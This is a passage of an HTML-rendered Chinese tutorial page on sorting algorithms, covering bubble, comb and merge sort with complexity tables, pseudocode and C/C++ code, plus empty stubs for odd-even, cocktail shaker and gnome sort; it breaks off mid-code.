<h2 id="交换类"><a href="#交换类" class="headerlink" title="交换类"></a>交换类</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>将无序数据集想象为一个垂直的柱体，其中最小的元素在顶部，最大的元素在底部。排序时每次从底部依次比较相邻元素，将较小元素不断上浮，直至上浮至正确位置。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">BubbleSort</td>
<td align="left">n</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">1</td>
<td align="left">yes</td>
<td align="left">交换</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="bubblesort"><ul class="nav-tabs"><li class="tab active"><a href="#bubblesort-1">Pseudo</a></li><li class="tab"><a href="#bubblesort-2">C</a></li><li class="tab"><a href="#bubblesort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bubblesort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BubbleSort(A[<span class="type">n</span>])</span><br><span class="line">    <span class="comment"># 从第1个元素开始，冒泡到倒数第2个元素（最后一个元素一定有序）</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to n<span class="literal">-1</span></span><br><span class="line">        <span class="comment"># 从后向前冒泡，依次交换相邻元素直至最小值冒泡到正确位置</span></span><br><span class="line">        <span class="keyword">for</span> j = n to i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> A<span class="function">[<span class="type">j</span>] &lt; <span class="title">A</span></span><span class="function">[<span class="type">j</span>-<span class="number">1</span>]</span></span><br><span class="line">                swap(A[<span class="type">j</span>], A[<span class="type">j</span>-<span class="number">1</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bubblesort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BubbleSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = n<span class="number">-1</span>; j &gt; i; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[j] &lt; A[j<span class="number">-1</span>]) &#123;</span><br><span class="line">                tmp = A[j];</span><br><span class="line">                A[j] = A[j<span class="number">-1</span>];</span><br><span class="line">                A[j<span class="number">-1</span>] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bubblesort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = n<span class="number">-1</span>; j &gt; i; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[j] &lt; A[j<span class="number">-1</span>]) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(A[j], A[j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="奇偶排序"><a href="#奇偶排序" class="headerlink" title="奇偶排序"></a>奇偶排序</h3><table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">OddEvenSort</td>
<td align="left">n</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">1</td>
<td align="left">yes</td>
<td align="left">交换</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="oddevensort"><ul class="nav-tabs"><li class="tab active"><a href="#oddevensort-1">Pseudo</a></li><li class="tab"><a href="#oddevensort-2">C</a></li><li class="tab"><a href="#oddevensort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="oddevensort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">OddEvenSort(A[<span class="type">n</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="oddevensort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">OddEvenSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="oddevensort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OddEvenSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="摇摆式排序"><a href="#摇摆式排序" class="headerlink" title="摇摆式排序"></a>摇摆式排序</h3><table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CocktailShakerSort</td>
<td align="left">n</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">1</td>
<td align="left">yes</td>
<td align="left">交换</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="cocktailshakersort"><ul class="nav-tabs"><li class="tab active"><a href="#cocktailshakersort-1">Pseudo</a></li><li class="tab"><a href="#cocktailshakersort-2">C</a></li><li class="tab"><a href="#cocktailshakersort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="cocktailshakersort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">CocktailShakerSort(A[<span class="type">n</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cocktailshakersort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CocktailShakerSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cocktailshakersort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CocktailShakerSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="侏儒排序"><a href="#侏儒排序" class="headerlink" title="侏儒排序"></a>侏儒排序</h3><table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GnomeSort</td>
<td align="left">n</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">1</td>
<td align="left">yes</td>
<td align="left">交换</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="gnomesort"><ul class="nav-tabs"><li class="tab active"><a href="#gnomesort-1">Pseudo</a></li><li class="tab"><a href="#gnomesort-2">C</a></li><li class="tab"><a href="#gnomesort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="gnomesort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">GnomeSort(A[<span class="type">n</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="gnomesort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">GnomeSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="gnomesort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GnomeSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="梳排序"><a href="#梳排序" class="headerlink" title="梳排序"></a>梳排序</h3><p>1980年由<code>Włodzimierz Dobosiewicz</code>和<code>Artur Borowy</code>设计。<br>1991年被<code>Stephen Lacey</code>和<code>Richard Box</code>命名为<code>”CombSort“</code>。<br>梳排序可以看成对<a href="#%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F"><strong>冒泡排序</strong></a>的一种改进。通过步长确定（头&#x2F;尾）数据长度以及对应关系，将各对元素进行交换，使得小值元素在头部，大值元素在尾部。逐渐减小步长以增大尾部范围并重复上述过程，以使得数据愈加有序，最终只需要通过基本排序算法（多为冒泡排序）进行少量的调整即可实现整体有序。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CombSort</td>
<td align="left">$n\log n$</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">1</td>
<td align="left">no</td>
<td align="left">交换</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="combsort"><ul class="nav-tabs"><li class="tab active"><a href="#combsort-1">Pseudo</a></li><li class="tab"><a href="#combsort-2">C</a></li><li class="tab"><a href="#combsort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="combsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">CombSort(A[<span class="type">n</span>])</span><br><span class="line">    <span class="comment"># 预处理：先将一些大值元素交换到数组的尾部（步长变化因子1.3为经验值）</span></span><br><span class="line">    step = n</span><br><span class="line">    <span class="keyword">while</span> (step = step/<span class="number">1.3</span>) &gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 按步长选定一对元素进行交换，使得小值元素在头部，大值元素在尾部</span></span><br><span class="line">        <span class="keyword">for</span> i = n to step</span><br><span class="line">            <span class="keyword">if</span> A<span class="function">[<span class="type">i</span>] &lt; <span class="title">A</span></span><span class="function">[<span class="type">i</span>-<span class="type">step</span>]</span></span><br><span class="line">                swap(A[<span class="type">i</span>], A[<span class="type">i</span>-<span class="type">step</span>])</span><br><span class="line">    <span class="comment"># 冒泡排序：只要完成一次冒泡后没有发生交换，就会终止排序</span></span><br><span class="line">    again = true</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">0</span> to n<span class="literal">-1</span> and again = true</span><br><span class="line">        again = false</span><br><span class="line">        <span class="keyword">for</span> j = n to i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> A<span class="function">[<span class="type">j</span>] &lt; <span class="title">A</span></span><span class="function">[<span class="type">j</span>-<span class="number">1</span>]</span></span><br><span class="line">                swap(A[<span class="type">j</span>], A[<span class="type">j</span>-<span class="number">1</span>])</span><br><span class="line">                again = true</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="combsort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CombSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, step = n, tmp, again;</span><br><span class="line">    <span class="keyword">while</span> ((step = (<span class="type">int</span>)(step/<span class="number">1.3</span>)) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = n<span class="number">-1</span>; i &gt;= step; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] &lt; A[i-step]) &#123;</span><br><span class="line">                tmp = A[i];</span><br><span class="line">                A[i] = A[i-step];</span><br><span class="line">                A[i-step] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    again = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n<span class="number">-1</span> &amp;&amp; again; i++) &#123;</span><br><span class="line">        again = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = n<span class="number">-1</span>; j &gt; i; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[j] &lt; A[j<span class="number">-1</span>]) &#123;</span><br><span class="line">                tmp = A[j];</span><br><span class="line">                A[j] = A[j<span class="number">-1</span>];</span><br><span class="line">                A[j<span class="number">-1</span>] = tmp;</span><br><span class="line">                again = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="combsort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CombSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> step = n;</span><br><span class="line">    <span class="keyword">while</span> ((step = (<span class="type">int</span>)(step/<span class="number">1.3</span>)) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n<span class="number">-1</span>; i &gt;= step; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] &lt; A[i-step]) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(A[i], A[i-step]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">bool</span> again = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        again = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = n<span class="number">-1</span>; j &gt; i; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[j] &lt; A[j<span class="number">-1</span>]) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(A[j], A[j<span class="number">-1</span>]);</span><br><span class="line">                again = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="归并类"><a href="#归并类" class="headerlink" title="归并类"></a>归并类</h2><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>1945年由约翰·冯·诺依曼（<code>John von Neumann</code>）发明。</p>
<p>归并排序的时间复杂度也为$n\log n$，与快速排序比较，在应用数组时较慢，而<strong>应用于链表时较快</strong>，这是因为归并排序会涉及更多移动和更少比较操作。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">MergeSort</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">n</td>
<td align="left">yes</td>
<td align="left">合并</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="mergesort"><ul class="nav-tabs"><li class="tab active"><a href="#mergesort-1">Pseudo</a></li><li class="tab"><a href="#mergesort-2">C</a></li><li class="tab"><a href="#mergesort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="mergesort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 合并两个有序子列表[p,mid]和[mid+1, r]</span></span><br><span class="line">Merge(A[<span class="type">p</span>,<span class="type">mid</span>], A[<span class="type">mid</span>+<span class="number">1</span>,<span class="type">r</span>], B)</span><br><span class="line">    <span class="comment"># 左侧一半、右侧一半、归并后的数据的起始位置</span></span><br><span class="line">    i = p</span><br><span class="line">    j = mid+<span class="number">1</span></span><br><span class="line">    k = p</span><br><span class="line">    <span class="comment"># 持续比较左右半边的元素，直至较短的一半先归并完成</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= mid and j &lt;= <span class="built_in">r</span></span><br><span class="line">        <span class="keyword">if</span> A[<span class="type">i</span>] &lt; A[<span class="type">j</span>]</span><br><span class="line">            B[<span class="type">k</span>++] = A[<span class="type">i</span>++]</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            B[<span class="type">k</span>++] = A[<span class="type">j</span>++]</span><br><span class="line">    <span class="comment"># 如果左半边较长，将左边剩余的元素归并完成</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= mid</span><br><span class="line">        B[<span class="type">k</span>++] = A[<span class="type">i</span>++]</span><br><span class="line">    <span class="comment"># 如果右半边较长，将右边剩余的元素归并完成</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= <span class="built_in">r</span></span><br><span class="line">        B[<span class="type">k</span>++] = A[<span class="type">j</span>++]</span><br><span class="line">    <span class="comment"># 将归并后的数据替换到原始数据中</span></span><br><span class="line">    <span class="keyword">for</span> i = p to <span class="built_in">r</span></span><br><span class="line">        A[<span class="type">i</span>] = B[<span class="type">i</span>]</span><br><span class="line"><span class="comment"># 自顶向下归并（递归实现）</span></span><br><span class="line">MergeSort_t(A[<span class="type">p</span>,<span class="type">r</span>], B)</span><br><span class="line">    <span class="keyword">if</span> p &lt; <span class="built_in">r</span></span><br><span class="line">        <span class="comment"># 计算中间位置</span></span><br><span class="line">        mid = (p+<span class="built_in">r</span>)/<span class="number">2</span></span><br><span class="line">        <span class="comment"># 排序左侧一半</span></span><br><span class="line">        MergeSort_t(A, p, mid, B)</span><br><span class="line">        <span class="comment"># 排序右侧一半</span></span><br><span class="line">        MergeSort_t(A, mid+<span class="number">1</span>, <span class="built_in">r</span>, B)</span><br><span class="line">        <span class="comment"># 将排好序的两半元素合并到一起</span></span><br><span class="line">        Merge(A, p, mid, <span class="built_in">r</span>, B)</span><br><span class="line"><span class="comment"># 自底向上归并（迭代实现）</span></span><br><span class="line">MergeSort_b(A[<span class="type">n</span>], B)</span><br><span class="line">    <span class="comment"># 当子列表宽度为1时，每个元素都是有序的，两个子列表合并后宽度翻倍，直至整个列表有序</span></span><br><span class="line">    <span class="keyword">for</span> width = <span class="number">1</span> to n<span class="literal">-1</span></span><br><span class="line">        <span class="comment"># 将整个列表按宽度切分为各个子列表，然后合并相邻的子列表</span></span><br><span class="line">        <span class="keyword">for</span> i = <span class="number">1</span> to n<span class="literal">-1</span></span><br><span class="line">            <span class="comment"># 计算两个子列表位置后执行合并</span></span><br><span class="line">            p = min(i+width<span class="literal">-1</span>, n)</span><br><span class="line">            <span class="built_in">r</span> = min(i+width*<span class="number">2</span><span class="literal">-1</span>, n)</span><br><span class="line">            Merge(A, i, p, <span class="built_in">r</span>, B)</span><br><span class="line">            <span class="comment"># 跳过已经合并的两个子列表</span></span><br><span class="line">            i = <span class="number">2</span>*width + i</span><br><span class="line">        <span class="comment"># 子列表宽度翻倍</span></span><br><span class="line">        width = <span class="number">2</span>*width</span><br><span class="line">MergeSort(A[<span class="type">n</span>])</span><br><span class="line">    <span class="comment"># 归并排序需要空间存储合并后的数据</span></span><br><span class="line">    B[<span class="type">n</span>]: empty</span><br><span class="line">    <span class="keyword">if</span> useTopDown</span><br><span class="line">        MergeSort_t(A, <span class="number">1</span>, n, B)</span><br><span class="line">    <span class="keyword">if</span> useBottomUp</span><br><span class="line">        MergeSort_b(A, n, B)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="mergesort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Merge</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> p, <span class="type">int</span> mid, <span class="type">int</span> r, <span class="type">int</span> B[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    i = p;</span><br><span class="line">    j = mid+<span class="number">1</span>;</span><br><span class="line">    k = p;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">        <span class="keyword">if</span> (A[i] &lt; A[j])</span><br><span class="line">            B[k++] = A[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            B[k++] = A[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid)</span><br><span class="line">        B[k++] = A[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r)</span><br><span class="line">        B[k++] = A[j++];</span><br><span class="line">    <span class="keyword">for</span> (i = p; i &lt;= r; i++)</span><br><span class="line">        A[i] = B[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MergeSort_t</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> p, <span class="type">int</span> r, <span class="type">int</span> B[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; r) &#123;</span><br><span class="line">        mid = (p+r)/<span class="number">2</span>;</span><br><span class="line">        MergeSort_t(A, p, mid, B);</span><br><span class="line">        MergeSort_t(A, mid+<span class="number">1</span>, r, B);</span><br><span class="line">        Merge(A, p, mid, r, B);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MergeSort_b</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n, <span class="type">int</span> B[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> width, i, p, r;</span><br><span class="line">    <span class="keyword">for</span> (width = <span class="number">1</span>; width &lt; n; width *= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i += <span class="number">2</span>*width) &#123;</span><br><span class="line">            p = i+width<span class="number">-1</span>;</span><br><span class="line">            r = i+width*<span class="number">2</span><span class="number">-1</span>;</span><br><span class="line">            p = p &gt; n<span class="number">-1</span> ? n<span class="number">-1</span> : p;</span><br><span class="line">            r = r &gt; n<span class="number">-1</span> ? n<span class="number">-1</span> : r;</span><br><span class="line">            Merge(A, i, p, r, B);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MergeSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *B = (<span class="type">int</span>*)<span class="built_in">malloc</span>(n*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (t) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: MergeSort_t(A, <span class="number">0</span>, n<span class="number">-1</span>, B); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: MergeSort_b(A, n, B); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="mergesort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> p, <span class="type">int</span> mid, <span class="type">int</span> r, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = p;</span><br><span class="line">    <span class="type">int</span> j = mid+<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> k = p;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">        <span class="keyword">if</span> (A[i] &lt; A[j])</span><br><span class="line">            B[k++] = A[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            B[k++] = A[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid)</span><br><span class="line">        B[k++] = A[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r)</span><br><span class="line">        B[k++] = A[j++];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = p; i &lt;= r; i++)</span><br><span class="line">        A[i] = B[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort_t</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> p, <span class="type">int</span> r, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (p+r)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">MergeSort_t</span>(A, p, mid, B);</span><br><span class="line">        <span class="built_in">MergeSort_t</span>(A, mid+<span class="number">1</span>, r, B);</span><br><span class="line">        <span class="built_in">Merge</span>(A, p, mid, r, B);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort_b</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> width = <span class="number">1</span>; width &lt; n; width *= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i += width*<span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">int</span> p = <span class="built_in">min</span>(i+width<span class="number">-1</span>, n<span class="number">-1</span>);</span><br><span class="line">            <span class="type">int</span> r = <span class="built_in">min</span>(i+width*<span class="number">2</span><span class="number">-1</span>, n<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">Merge</span>(A, i, p, r, B);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">B</span><span class="params">(n)</span></span>;</span><br><span class="line">    